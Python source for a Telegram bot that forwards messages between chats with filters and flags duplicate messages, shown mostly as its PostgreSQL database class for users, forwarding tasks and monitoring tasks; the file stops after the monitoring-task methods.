#!/usr/bin/env python3
"""
FORWARDER + DUODETECTIVE BOT
Combined bot that handles:
1. Message forwarding with filters
2. Duplicate message detection with notifications
"""

import os
import sys
import asyncio
import logging
import hashlib
import time
import gc
import json
import threading
import functools
import re
import signal
import pytz
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple, Set, Callable, Any, DefaultDict
from collections import OrderedDict, defaultdict, deque
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
import atexit

from flask import Flask, request, jsonify
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, FloodWaitError

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from telegram.helpers import escape_markdown

import psycopg
from psycopg.rows import dict_row
from urllib.parse import urlparse

# ============================
# LOGGING CONFIGURATION
# ============================
logging.getLogger("telethon").setLevel(logging.WARNING)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("flask").setLevel(logging.WARNING)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    datefmt='%H:%M:%S',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('combined_bot_debug.log', mode='a', encoding='utf-8')
    ]
)
logger = logging.getLogger("forwarder_duodetect")

# ============================
# ENVIRONMENT VARIABLES
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN")
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")

# Database configuration - PostgreSQL only
DATABASE_URL = os.getenv("DATABASE_URL")

if not DATABASE_URL:
    logger.error("DATABASE_URL must be set for PostgreSQL!")
    raise ValueError("DATABASE_URL environment variable is required")

logger.info("Using PostgreSQL database")

# User sessions from environment
USER_SESSIONS = {}
user_sessions_env = os.getenv("USER_SESSIONS", "").strip()
if user_sessions_env:
    for session_entry in user_sessions_env.split(","):
        if not session_entry or ":" not in session_entry:
            continue
        try:
            user_id_str, session_string = session_entry.split(":", 1)
            user_id = int(user_id_str.strip())
            USER_SESSIONS[user_id] = session_string.strip()
        except ValueError:
            continue

# User permissions
OWNER_IDS = set()
owner_env = os.getenv("OWNER_IDS", "").strip()
if owner_env:
    OWNER_IDS.update(int(part) for part in owner_env.split(",") if part.strip().isdigit())

ALLOWED_USERS = set()
allowed_env = os.getenv("ALLOWED_USERS", "").strip()
if allowed_env:
    ALLOWED_USERS.update(int(part) for part in allowed_env.split(",") if part.strip().isdigit())

# Performance settings
SEND_WORKER_COUNT = int(os.getenv("SEND_WORKER_COUNT", "50"))
SEND_QUEUE_MAXSIZE = int(os.getenv("SEND_QUEUE_MAXSIZE", "10000"))
MONITOR_WORKER_COUNT = int(os.getenv("MONITOR_WORKER_COUNT", "10"))
TARGET_RESOLVE_RETRY_SECONDS = int(os.getenv("TARGET_RESOLVE_RETRY_SECONDS", "3"))
MAX_CONCURRENT_USERS = max(50, int(os.getenv("MAX_CONCURRENT_USERS", "200")))
SEND_CONCURRENCY_PER_USER = int(os.getenv("SEND_CONCURRENCY_PER_USER", "30"))
SEND_RATE_PER_USER = float(os.getenv("SEND_RATE_PER_USER", "30.0"))
TARGET_ENTITY_CACHE_SIZE = int(os.getenv("TARGET_ENTITY_CACHE_SIZE", "100"))

# Duplicate detection settings
DUPLICATE_CHECK_WINDOW = int(os.getenv("DUPLICATE_CHECK_WINDOW", "600"))
MESSAGE_HASH_LIMIT = int(os.getenv("MESSAGE_HASH_LIMIT", "2000"))

# Web server
WEB_SERVER_PORT = int(os.getenv("WEB_SERVER_PORT", "5000"))
DEFAULT_CONTAINER_MAX_RAM_MB = int(os.getenv("CONTAINER_MAX_RAM_MB", "512"))

# GC interval
GC_INTERVAL = int(os.getenv("GC_INTERVAL", "600"))

# ============================
# REGEX PATTERNS
# ============================
EMOJI_PATTERN = re.compile(
    "["
    "\U0001F600-\U0001F64F"
    "\U0001F300-\U0001F5FF"
    "\U0001F680-\U0001F6FF"
    "\U0001F1E0-\U0001F1FF"
    "\U00002702-\U000027B0"
    "\U000024C2-\U0001F251"
    "]+", flags=re.UNICODE
)

WORD_PATTERN = re.compile(r'\S+')
NUMERIC_PATTERN = re.compile(r'^\d+$')
ALPHABETIC_PATTERN = re.compile(r'^[A-Za-z]+$')

# ============================
# UNAUTHORIZED MESSAGE
# ============================
UNAUTHORIZED_MESSAGE = """🚫 **Access Denied!** 

You are not authorized to use this bot.

📞 **Call this number:** `07089430305`

Or

🗨️ **Message Developer:** [HEMMY](https://t.me/justmemmy)
"""

# ============================
# DATABASE CLASS (POSTGRESQL ONLY)
# ============================
class Database:
    
    def __init__(self):
        self.postgres_url = DATABASE_URL
        
        self._conn_init_lock = threading.Lock()
        self._thread_local = threading.local()
        self._thread_pool = ThreadPoolExecutor(max_workers=5, thread_name_prefix="db_worker")
        
        # Cache structures
        self._user_cache: Dict[int, Dict] = {}
        self._forwarding_tasks_cache: Dict[int, List[Dict]] = defaultdict(list)
        self._monitoring_tasks_cache: Dict[int, List[Dict]] = defaultdict(list)
        self._allowed_users_cache: Set[int] = set()
        self._admin_cache: Set[int] = set()
        
        max_retries = 3
        for attempt in range(max_retries):
            try:
                logger.info(f"Initializing database (attempt {attempt + 1}/{max_retries})...")
                self.init_db()
                logger.info("Database schema initialized successfully")
                
                # Small delay to ensure schema is committed
                time.sleep(1)
                
                # Now load caches
                self._load_caches()
                logger.info("Database caches loaded successfully")
                break
                
            except Exception as e:
                logger.error(f"Attempt {attempt + 1} failed: {e}")
                if attempt < max_retries - 1:
                    logger.info("Retrying in 2 seconds...")
                    time.sleep(2)
                else:
                    logger.error("All retries failed. The bot may start with empty caches.")
                    # Initialize empty caches to allow bot to start
                    self._user_cache = {}
                    self._forwarding_tasks_cache = defaultdict(list)
                    self._monitoring_tasks_cache = defaultdict(list)
                    self._allowed_users_cache = set()
                    self._admin_cache = set()
        
        atexit.register(self.close_connection)
    
    def _create_postgres_connection(self) -> psycopg.Connection:
        if not self.postgres_url:
            raise ValueError("DATABASE_URL not set for PostgreSQL")
        
        parsed = urlparse(self.postgres_url)
        
        dbname = parsed.path[1:]
        user = parsed.username
        password = parsed.password
        host = parsed.hostname
        port = parsed.port or 5432
        
        conn_str = f"postgresql://{user}:{password}@{host}:{port}/{dbname}"
        
        if parsed.query:
            params = dict(pair.split('=') for pair in parsed.query.split('&') if '=' in pair)
            sslmode = params.get('sslmode', 'require')
            conn_str += f"?sslmode={sslmode}"
        
        conn = psycopg.connect(
            conn_str,
            autocommit=False,
            row_factory=dict_row
        )
        return conn
    
    def _load_caches(self):
        try:
            conn = self.get_connection()
            
            with conn.cursor() as cur:
                # Check if required columns exist before querying
                cur.execute("""
                    SELECT column_name 
                    FROM information_schema.columns 
                    WHERE table_name = 'users' 
                    AND table_schema = 'public'
                    AND column_name IN ('is_logged_in', 'session_data', 'phone', 'name')
                """)
                existing_columns = {row[0] for row in cur.fetchall()}
                
                required_columns = {'is_logged_in', 'session_data', 'phone', 'name'}
                missing_columns = required_columns - existing_columns
                
                if missing_columns:
                    logger.warning(f"Skipping cache load, missing columns in users table: {missing_columns}")
                    # Try to fix the schema
                    self._migrate_missing_columns()
                    return
                
                # Load allowed users and admins
                cur.execute("SELECT user_id, is_admin FROM allowed_users")
                rows = cur.fetchall()
                for row in rows:
                    user_id = row["user_id"]
                    self._allowed_users_cache.add(user_id)
                    if row["is_admin"]:
                        self._admin_cache.add(user_id)
                
                # Load logged-in users
                cur.execute("""
                    SELECT user_id, phone, name, session_data, is_logged_in, created_at, updated_at 
                    FROM users WHERE is_logged_in = TRUE
                """)
                rows = cur.fetchall()
                for row in rows:
                    uid = row["user_id"]
                    entry = {
                        'user_id': uid,
                        'phone': row["phone"],
                        'name': row["name"],
                        'session_data': row["session_data"],
                        'is_logged_in': row["is_logged_in"],
                        'created_at': row["created_at"].isoformat() if row["created_at"] else None,
                        'updated_at': row["updated_at"].isoformat() if row["updated_at"] else None
                    }
                    self._user_cache[uid] = entry

            logger.info(f"Loaded caches: {len(self._allowed_users_cache)} allowed users, {len(self._user_cache)} logged-in users")
        except Exception as e:
            logger.exception("Error loading caches: %s", e)
            # Don't crash, continue with empty caches
    
    def _migrate_missing_columns(self):
        """Helper to migrate missing columns on the fly"""
        try:
            conn = self.get_connection()
            with conn.cursor() as cur:
                # Check users table
                cur.execute("""
                    SELECT column_name 
                    FROM information_schema.columns 
                    WHERE table_name = 'users' 
                    AND table_schema = 'public'
                """)
                existing_columns = {row[0] for row in cur.fetchall()}
                
                if 'is_logged_in' not in existing_columns:
                    logger.info("Migrating: Adding 'is_logged_in' column to users table")
                    cur.execute("ALTER TABLE users ADD COLUMN is_logged_in BOOLEAN DEFAULT FALSE")
                    conn.commit()
                    
        except Exception as e:
            logger.error(f"Migration failed: {e}")
    
    def get_connection(self):
        conn = getattr(self._thread_local, "conn", None)
        
        if conn:
            try:
                with conn.cursor() as cur:
                    cur.execute("SELECT 1")
                return conn
            except Exception:
                try:
                    conn.close()
                except Exception:
                    pass
                self._thread_local.conn = None
        
        try:
            self._thread_local.conn = self._create_postgres_connection()
            return self._thread_local.conn
        except Exception as e:
            logger.exception("Failed to create DB connection: %s", e)
            raise
    
    def close_connection(self):
        conn = getattr(self._thread_local, "conn", None)
        if conn:
            try:
                conn.close()
            except Exception:
                logger.exception("Failed to close DB connection")
            self._thread_local.conn = None
    
    def init_db(self):
        with self._conn_init_lock:
            conn = self.get_connection()
            
            with conn.cursor() as cur:
                # ============================
                # PHASE 1: CREATE TABLES IF NOT EXISTS
                # ============================
                
                # Create users table first (others depend on it)
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS users (
                        user_id BIGINT PRIMARY KEY,
                        phone VARCHAR(255),
                        name TEXT,
                        session_data TEXT,
                        is_logged_in BOOLEAN DEFAULT FALSE,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                """)
                
                # Create allowed_users table (no dependencies)
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS allowed_users (
                        user_id BIGINT PRIMARY KEY,
                        username VARCHAR(255),
                        is_admin BOOLEAN DEFAULT FALSE,
                        added_by BIGINT,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                """)
                
                # Create forwarding_tasks table (depends on users)
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS forwarding_tasks (
                        id SERIAL PRIMARY KEY,
                        user_id BIGINT,
                        label VARCHAR(255),
                        source_ids JSONB,
                        target_ids JSONB,
                        filters JSONB,
                        is_active BOOLEAN DEFAULT TRUE,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                """)
                
                # Create monitoring_tasks table (depends on users)
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS monitoring_tasks (
                        id SERIAL PRIMARY KEY,
                        user_id BIGINT,
                        label VARCHAR(255),
                        chat_ids JSONB,
                        settings JSONB,
                        is_active BOOLEAN DEFAULT TRUE,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                """)
                
                conn.commit()  # Commit table creation first
                
                # ============================
                # PHASE 2: ADD FOREIGN KEY CONSTRAINTS (if missing)
                # ============================
                
                # Check and add foreign key constraint for forwarding_tasks
                try:
                    cur.execute("""
                        ALTER TABLE forwarding_tasks 
                        ADD CONSTRAINT fk_forwarding_tasks_user 
                        FOREIGN KEY (user_id) REFERENCES users(user_id) 
                        ON DELETE CASCADE
                    """)
                    logger.info("Added foreign key constraint to forwarding_tasks")
                except Exception as e:
                    logger.debug(f"Foreign key constraint for forwarding_tasks may already exist: {e}")
                
                # Check and add foreign key constraint for monitoring_tasks
                try:
                    cur.execute("""
                        ALTER TABLE monitoring_tasks 
                        ADD CONSTRAINT fk_monitoring_tasks_user 
                        FOREIGN KEY (user_id) REFERENCES users(user_id) 
                        ON DELETE CASCADE
                    """)
                    logger.info("Added foreign key constraint to monitoring_tasks")
                except Exception as e:
                    logger.debug(f"Foreign key constraint for monitoring_tasks may already exist: {e}")
                
                # Add UNIQUE constraint for forwarding_tasks
                try:
                    cur.execute("""
                        ALTER TABLE forwarding_tasks 
                        ADD CONSTRAINT unique_user_label 
                        UNIQUE (user_id, label)
                    """)
                    logger.info("Added unique constraint to forwarding_tasks")
                except Exception as e:
                    logger.debug(f"Unique constraint for forwarding_tasks may already exist: {e}")
                
                # Add UNIQUE constraint for monitoring_tasks
                try:
                    cur.execute("""
                        ALTER TABLE monitoring_tasks 
                        ADD CONSTRAINT unique_monitoring_user_label 
                        UNIQUE (user_id, label)
                    """)
                    logger.info("Added unique constraint to monitoring_tasks")
                except Exception as e:
                    logger.debug(f"Unique constraint for monitoring_tasks may already exist: {e}")
                
                # ============================
                # PHASE 3: MIGRATION - ENSURE ALL COLUMNS EXIST
                # ============================
                
                # Dictionary of tables and their required columns
                table_columns = {
                    'users': [
                        ('user_id', 'ADD COLUMN user_id BIGINT PRIMARY KEY'),
                        ('phone', 'ADD COLUMN phone VARCHAR(255)'),
                        ('name', 'ADD COLUMN name TEXT'),
                        ('session_data', 'ADD COLUMN session_data TEXT'),
                        ('is_logged_in', 'ADD COLUMN is_logged_in BOOLEAN DEFAULT FALSE'),
                        ('created_at', 'ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP'),
                        ('updated_at', 'ADD COLUMN updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP'),
                    ],
                    'forwarding_tasks': [
                        ('id', 'ADD COLUMN id SERIAL PRIMARY KEY'),
                        ('user_id', 'ADD COLUMN user_id BIGINT'),
                        ('label', 'ADD COLUMN label VARCHAR(255)'),
                        ('source_ids', 'ADD COLUMN source_ids JSONB'),
                        ('target_ids', 'ADD COLUMN target_ids JSONB'),
                        ('filters', 'ADD COLUMN filters JSONB'),
                        ('is_active', 'ADD COLUMN is_active BOOLEAN DEFAULT TRUE'),
                        ('created_at', 'ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP'),
                        ('updated_at', 'ADD COLUMN updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP'),
                    ],
                    'monitoring_tasks': [
                        ('id', 'ADD COLUMN id SERIAL PRIMARY KEY'),
                        ('user_id', 'ADD COLUMN user_id BIGINT'),
                        ('label', 'ADD COLUMN label VARCHAR(255)'),
                        ('chat_ids', 'ADD COLUMN chat_ids JSONB'),
                        ('settings', 'ADD COLUMN settings JSONB'),
                        ('is_active', 'ADD COLUMN is_active BOOLEAN DEFAULT TRUE'),
                        ('created_at', 'ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP'),
                        ('updated_at', 'ADD COLUMN updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP'),
                    ],
                    'allowed_users': [
                        ('user_id', 'ADD COLUMN user_id BIGINT PRIMARY KEY'),
                        ('username', 'ADD COLUMN username VARCHAR(255)'),
                        ('is_admin', 'ADD COLUMN is_admin BOOLEAN DEFAULT FALSE'),
                        ('added_by', 'ADD COLUMN added_by BIGINT'),
                        ('created_at', 'ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP'),
                    ]
                }
                
                # Check and add missing columns for each table
                for table_name, columns in table_columns.items():
                    cur.execute("""
                        SELECT column_name 
                        FROM information_schema.columns 
                        WHERE table_name = %s 
                        AND table_schema = 'public'
                    """, (table_name,))
                    existing_columns = {row[0] for row in cur.fetchall()}
                    
                    for column_name, alter_sql in columns:
                        if column_name not in existing_columns:
                            logger.info(f"Adding missing column '{column_name}' to {table_name} table")
                            try:
                                # Special handling for primary key columns
                                if 'PRIMARY KEY' in alter_sql:
                                    # First add the column
                                    alter_sql_simple = alter_sql.replace(' PRIMARY KEY', '')
                                    cur.execute(f"ALTER TABLE {table_name} {alter_sql_simple}")
                                    # Then add primary key constraint
                                    if table_name == 'users' or table_name == 'allowed_users':
                                        cur.execute(f"ALTER TABLE {table_name} ADD PRIMARY KEY (user_id)")
                                else:
                                    cur.execute(f"ALTER TABLE {table_name} {alter_sql}")
                            except Exception as e:
                                logger.warning(f"Could not add column '{column_name}' to {table_name}: {e}")
                
                # ============================
                # PHASE 4: CREATE INDEXES IF NOT EXISTS
                # ============================
                
                indexes = [
                    ("idx_users_logged_in", "CREATE INDEX IF NOT EXISTS idx_users_logged_in ON users(is_logged_in)"),
                    ("idx_forwarding_tasks_user_active", "CREATE INDEX IF NOT EXISTS idx_forwarding_tasks_user_active ON forwarding_tasks(user_id, is_active)"),
                    ("idx_monitoring_tasks_user_active", "CREATE INDEX IF NOT EXISTS idx_monitoring_tasks_user_active ON monitoring_tasks(user_id, is_active)"),
                    ("idx_allowed_admins", "CREATE INDEX IF NOT EXISTS idx_allowed_admins ON allowed_users(is_admin)"),
                ]
                
                for index_name, create_sql in indexes:
                    try:
                        cur.execute(create_sql)
                    except Exception as e:
                        logger.warning(f"Could not create index '{index_name}': {e}")
                
                # ============================
                # PHASE 5: DATA MIGRATION (Safe Updates)
                # ============================
                
                # Ensure all users have proper default values for new columns
                try:
                    # Update is_logged_in for existing NULL values
                    cur.execute("""
                        UPDATE users 
                        SET is_logged_in = FALSE 
                        WHERE is_logged_in IS NULL
                    """)
                    updated_count = cur.rowcount
                    if updated_count > 0:
                        logger.info(f"Updated {updated_count} users with is_logged_in = FALSE")
                    
                    # Update updated_at for existing NULL values
                    cur.execute("""
                        UPDATE users 
                        SET updated_at = CURRENT_TIMESTAMP 
                        WHERE updated_at IS NULL
                    """)
                    updated_count = cur.rowcount
                    if updated_count > 0:
                        logger.info(f"Updated {updated_count} users with updated_at timestamp")
                    
                    # Update forwarding_tasks updated_at
                    cur.execute("""
                        UPDATE forwarding_tasks 
                        SET updated_at = CURRENT_TIMESTAMP 
                        WHERE updated_at IS NULL
                    """)
                    
                    # Update monitoring_tasks updated_at
                    cur.execute("""
                        UPDATE monitoring_tasks 
                        SET updated_at = CURRENT_TIMESTAMP 
                        WHERE updated_at IS NULL
                    """)
                    
                except Exception as e:
                    logger.warning(f"Data migration had issues (non-critical): {e}")
                
                # ============================
                # PHASE 6: VERIFY FINAL SCHEMA
                # ============================
                
                # Log final table structure
                for table_name in table_columns.keys():
                    cur.execute("""
                        SELECT column_name, data_type, is_nullable, column_default
                        FROM information_schema.columns 
                        WHERE table_name = %s AND table_schema = 'public'
                        ORDER BY ordinal_position
                    """, (table_name,))
                    columns = cur.fetchall()
                    logger.info(f"Table '{table_name}' has {len(columns)} columns: {[col[0] for col in columns]}")
                
            conn.commit()
            
            logger.info("✅ Database schema is fully initialized, migrated, and verified")
    
    def get_user(self, user_id: int) -> Optional[Dict]:
        if user_id in self._user_cache:
            return self._user_cache[user_id].copy()

        try:
            conn = self.get_connection()
            
            with conn.cursor() as cur:
                cur.execute("""
                    SELECT user_id, phone, name, session_data, is_logged_in, created_at, updated_at 
                    FROM users WHERE user_id = %s
                """, (user_id,))
                row = cur.fetchone()

                if row:
                    user_data = {
                        'user_id': row["user_id"],
                        'phone': row["phone"],
                        'name': row["name"],
                        'session_data': row["session_data"],
                        'is_logged_in': row["is_logged_in"],
                        'created_at': row["created_at"].isoformat() if row["created_at"] else None,
                        'updated_at': row["updated_at"].isoformat() if row["updated_at"] else None
                    }
                    self._user_cache[user_id] = user_data
                    return user_data.copy()
                        
            return None
        except Exception as e:
            logger.exception("Error in get_user for %s: %s", user_id, e)
            return None
    
    def save_user(self, user_id: int, phone: Optional[str] = None, name: Optional[str] = None,
                  session_data: Optional[str] = None, is_logged_in: bool = False):
        try:
            conn = self.get_connection()
            
            with conn.cursor() as cur:
                cur.execute("""
                    INSERT INTO users (user_id, phone, name, session_data, is_logged_in)
                    VALUES (%s, %s, %s, %s, %s)
                    ON CONFLICT (user_id) DO UPDATE SET
                        phone = EXCLUDED.phone,
                        name = EXCLUDED.name,
                        session_data = EXCLUDED.session_data,
                        is_logged_in = EXCLUDED.is_logged_in,
                        updated_at = CURRENT_TIMESTAMP
                """, (user_id, phone, name, session_data, is_logged_in))
                
            conn.commit()

            # Update cache
            if user_id in self._user_cache:
                user_data = self._user_cache[user_id]
                if phone is not None:
                    user_data['phone'] = phone
                if name is not None:
                    user_data['name'] = name
                if session_data is not None:
                    user_data['session_data'] = session_data
                user_data['is_logged_in'] = is_logged_in
                user_data['updated_at'] = datetime.now().isoformat()
            else:
                if is_logged_in:
                    self._user_cache[user_id] = {
                        'user_id': user_id,
                        'phone': phone,
                        'name': name,
                        'session_data': session_data,
                        'is_logged_in': is_logged_in,
                        'updated_at': datetime.now().isoformat()
                    }

        except Exception as e:
            logger.exception("Error in save_user for %s: %s", user_id, e)
            raise
    
    def purge_user_data(self, user_id: int) -> bool:
        """
        Completely purge all user data on logout.
        Returns True if successful.
        """
        try:
            conn = self.get_connection()
            
            with conn.cursor() as cur:
                # Delete from forwarding_tasks
                cur.execute("DELETE FROM forwarding_tasks WHERE user_id = %s", (user_id,))
                # Delete from monitoring_tasks
                cur.execute("DELETE FROM monitoring_tasks WHERE user_id = %s", (user_id,))
                # Clear user session data
                cur.execute("""
                    UPDATE users 
                    SET phone = NULL, 
                        name = NULL, 
                        session_data = NULL, 
                        is_logged_in = FALSE,
                        updated_at = CURRENT_TIMESTAMP
                    WHERE user_id = %s
                """, (user_id,))
                conn.commit()
            
            # Clear all caches for this user
            self._user_cache.pop(user_id, None)
            self._forwarding_tasks_cache.pop(user_id, None)
            self._monitoring_tasks_cache.pop(user_id, None)
            
            logger.info(f"Purged all data for user {user_id} on logout")
            return True
            
        except Exception as e:
            logger.exception(f"Error purging user data for {user_id}: {e}")
            return False
    
    # ============================
    # FORWARDING TASKS METHODS
    # ============================
    def add_forwarding_task(self, user_id: int, label: str, source_ids: List[int], 
                           target_ids: List[int], filters: Optional[Dict[str, Any]] = None) -> bool:
        try:
            conn = self.get_connection()
            
            if filters is None:
                filters = {
                    "filters": {
                        "raw_text": False,
                        "numbers_only": False,
                        "alphabets_only": False,
                        "removed_alphabetic": False,
                        "removed_numeric": False,
                        "prefix": "",
                        "suffix": ""
                    },
                    "outgoing": True,
                    "forward_tag": False,
                    "control": True
                }
            
            with conn.cursor() as cur:
                try:
                    cur.execute(
                        """
                        INSERT INTO forwarding_tasks (user_id, label, source_ids, target_ids, filters)
                        VALUES (%s, %s, %s, %s, %s)
                        ON CONFLICT (user_id, label) DO NOTHING
                        RETURNING id
                    """,
                        (user_id, label, json.dumps(source_ids), json.dumps(target_ids), json.dumps(filters)),
                    )
                    row = cur.fetchone()
                    conn.commit()
                    
                    if row:
                        task_id = row["id"]
                        task = {
                            "id": task_id,
                            "label": label,
                            "source_ids": source_ids,
                            "target_ids": target_ids,
                            "filters": filters,
                            "is_active": 1
                        }
                        self._forwarding_tasks_cache[user_id].append(task)
                        return True
                    return False
                except psycopg.errors.UniqueViolation:
                    return False
                        
        except Exception as e:
            logger.exception("Error in add_forwarding_task for %s: %s", user_id, e)
            raise
    
    def update_task_filters(self, user_id: int, label: str, filters: Dict[str, Any]) -> bool:
        try:
            conn = self.get_connection()
            
            with conn.cursor() as cur:
                cur.execute(
                    """
                    UPDATE forwarding_tasks 
                    SET filters = %s, updated_at = CURRENT_TIMESTAMP
                    WHERE user_id = %s AND label = %s
                    """,
                    (json.dumps(filters), user_id, label),
                )
                updated = cur.rowcount > 0
                conn.commit()

            if updated and user_id in self._forwarding_tasks_cache:
                for task in self._forwarding_tasks_cache[user_id]:
                    if task['label'] == label:
                        task['filters'] = filters
                        break

            return updated
        except Exception as e:
            logger.exception("Error in update_task_filters for %s, task %s: %s", user_id, label, e)
            raise
    
    def remove_forwarding_task(self, user_id: int, label: str) -> bool:
        try:
            conn = self.get_connection()
            
            with conn.cursor() as cur:
                cur.execute("DELETE FROM forwarding_tasks WHERE user_id = %s AND label = %s", (user_id, label))
                deleted = cur.rowcount > 0
                conn.commit()

            if deleted and user_id in self._forwarding_tasks_cache:
                self._forwarding_tasks_cache[user_id] = [t for t in self._forwarding_tasks_cache[user_id] if t.get('label') != label]

            return deleted
        except Exception as e:
            logger.exception("Error in remove_forwarding_task for %s: %s", user_id, e)
            raise
    
    def get_user_forwarding_tasks(self, user_id: int) -> List[Dict]:
        if user_id in self._forwarding_tasks_cache and self._forwarding_tasks_cache[user_id]:
            return [t.copy() for t in self._forwarding_tasks_cache[user_id]]

        try:
            conn = self.get_connection()
            tasks = []
            
            with conn.cursor() as cur:
                cur.execute(
                    """
                    SELECT id, label, source_ids, target_ids, filters, is_active, created_at
                    FROM forwarding_tasks
                    WHERE user_id = %s AND is_active = TRUE
                    ORDER BY created_at DESC
                """,
                    (user_id,),
                )

                for row in cur.fetchall():
                    tasks.append(
                        {
                            "id": row["id"],
                            "label": row["label"],
                            "source_ids": row["source_ids"] if row["source_ids"] else [],
                            "target_ids": row["target_ids"] if row["target_ids"] else [],
                            "filters": row["filters"] if row["filters"] else {},
                            "is_active": row["is_active"],
                            "created_at": row["created_at"].isoformat() if row["created_at"] else None,
                        }
                    )
            
            if tasks:
                self._forwarding_tasks_cache[user_id] = tasks

            return [t.copy() for t in tasks]
        except Exception as e:
            logger.exception("Error in get_user_forwarding_tasks for %s: %s", user_id, e)
            return []
    
    def get_all_active_forwarding_tasks(self) -> List[Dict]:
        try:
            conn = self.get_connection()
            tasks = []
            
            with conn.cursor() as cur:
                cur.execute(
                    """
                    SELECT user_id, id, label, source_ids, target_ids, filters
                    FROM forwarding_tasks
                    WHERE is_active = TRUE
                """
                )
                for row in cur.fetchall():
                    task = {
                        "user_id": row["user_id"],
                        "id": row["id"],
                        "label": row["label"],
                        "source_ids": row["source_ids"] if row["source_ids"] else [],
                        "target_ids": row["target_ids"] if row["target_ids"] else [],
                        "filters": row["filters"] if row["filters"] else {},
                    }
                    tasks.append(task)

                    uid = task["user_id"]
                    if uid not in self._forwarding_tasks_cache or not any(t['id'] == task['id'] for t in self._forwarding_tasks_cache.get(uid, [])):
                        self._forwarding_tasks_cache[uid].append({
                            "id": task["id"],
                            "label": task["label"],
                            "source_ids": task["source_ids"],
                            "target_ids": task["target_ids"],
                            "filters": task["filters"],
                            "is_active": 1
                        })
            return tasks
        except Exception as e:
            logger.exception("Error in get_all_active_forwarding_tasks: %s", e)
            raise
    
    # ============================
    # MONITORING TASKS METHODS
    # ============================
    def add_monitoring_task(self, user_id: int, label: str, chat_ids: List[int],
                           settings: Optional[Dict[str, Any]] = None) -> bool:
        try:
            conn = self.get_connection()

            if settings is None:
                settings = {
                    "check_duplicate_and_notify": True,
                    "manual_reply_system": True,
                    "auto_reply_system": False,
                    "auto_reply_message": "",
                    "outgoing_message_monitoring": True
                }
            
            with conn.cursor() as cur:
                try:
                    cur.execute("""
                        INSERT INTO monitoring_tasks (user_id, label, chat_ids, settings)
                        VALUES (%s, %s, %s, %s)
                        ON CONFLICT (user_id, label) DO NOTHING
                        RETURNING id
                    """, (user_id, label, json.dumps(chat_ids), json.dumps(settings)))
                    
                    row = cur.fetchone()
                    conn.commit()
                    
                    if row:
                        task_id = row["id"]
                        task = {
                            'id': task_id,
                            'label': label,
                            'chat_ids': chat_ids,
                            'settings': settings,
                            'is_active': 1
                        }
                        self._monitoring_tasks_cache[user_id].append(task)
                        return True
                    return False
                except psycopg.errors.UniqueViolation:
                    return False
                        
        except Exception as e:
            logger.exception("Error in add_monitoring_task for %s: %s", user_id, e)
            return False
    
    def update_task_settings(self, user_id: int, label: str, settings: Dict[str, Any]) -> bool:
        try:
            conn = self.get_connection()
            
            with conn.cursor() as cur:
                cur.execute("""
                    UPDATE monitoring_tasks
                    SET settings = %s, updated_at = CURRENT_TIMESTAMP
                    WHERE user_id = %s AND label = %s
                """, (json.dumps(settings), user_id, label))
                updated = cur.rowcount > 0
                conn.commit()

            if updated and user_id in self._monitoring_tasks_cache:
                for task in self._monitoring_tasks_cache[user_id]:
                    if task['label'] == label:
                        task['settings'] = settings
                        break

            return updated
        except Exception as e:
            logger.exception("Error in update_task_settings for %s, task %s: %s", user_id, label, e)
            return False
    
    def remove_monitoring_task(self, user_id: int, label: str) -> bool:
        try:
            conn = self.get_connection()
            
            with conn.cursor() as cur:
                cur.execute("DELETE FROM monitoring_tasks WHERE user_id = %s AND label = %s", (user_id, label))
                deleted = cur.rowcount > 0
                conn.commit()

            if deleted and user_id in self._monitoring_tasks_cache:
                self._monitoring_tasks_cache[user_id] = [t for t in self._monitoring_tasks_cache[user_id] if t.get('label') != label]

            return deleted
        except Exception as e:
            logger.exception("Error in remove_monitoring_task for %s: %s", user_id, e)
            return False
    
    def get_user_monitoring_tasks(self, user_id: int) -> List[Dict]:
        if user_id in self._monitoring_tasks_cache and self._monitoring_tasks_cache[user_id]:
            return [t.copy() for t in self._monitoring_tasks_cache[user_id]]

        try:
            conn = self.get_connection()
            tasks = []
            
            with conn.cursor() as cur:
                cur.execute("""
                    SELECT id, label, chat_ids, settings, is_active 
                    FROM monitoring_tasks 
                    WHERE user_id = %s AND is_active = TRUE 
                    ORDER BY created_at ASC
                """, (user_id,))
                
                for row in cur.fetchall():
                    task = {
                        'id': row["id"],
                        'label': row["label"],
                        'chat_ids': row["chat_ids"] if row["chat_ids"] else [],
                        'settings': row["settings"] if row["settings"] else {},
                        'is_active': row["is_active"]
                    }
                    tasks.append(task)

            if tasks:
                self._monitoring_tasks_cache[user_id] = tasks

            return [t.copy() for t in tasks]
        except Exception as e:
            logger.exception("Error in get_user_monitoring_tasks for %s: %s", user_id, e)
            return []
    
